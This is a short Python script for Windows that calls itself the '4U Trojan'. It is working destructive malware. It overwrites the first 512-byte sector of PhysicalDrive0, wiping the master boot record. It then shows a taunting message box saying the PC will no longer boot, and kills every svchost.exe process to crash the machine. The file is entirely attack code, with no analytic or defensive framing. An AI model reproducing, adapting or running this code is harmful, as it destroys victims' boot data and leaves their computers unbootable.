import ctypes
import os
import psutil
from win32file import *


hDevice = CreateFileW ("\\\\.\\PhysicalDrive0", 
         GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_EXISTING, 0,0)
WriteFile(hDevice,
              AllocateReadBuffer(512),
              None,
              )
CloseHandle(hDevice)

def MessageBox(title, text, style):
    return ctypes.windll.user32.MessageBoxW(0, text, title, style)


MessageBox('4U Trojan', 'Congratulations!\n\nYour pc has been fucked by the 4U Trojan\nYour PC will no longer boot up because the MBR\nhas been overwritten.\n\nPress OK to shut down', 0)

import psutil

for proc in psutil.process_iter():
    if proc.name() == "svchost.exe":
        proc.kill()

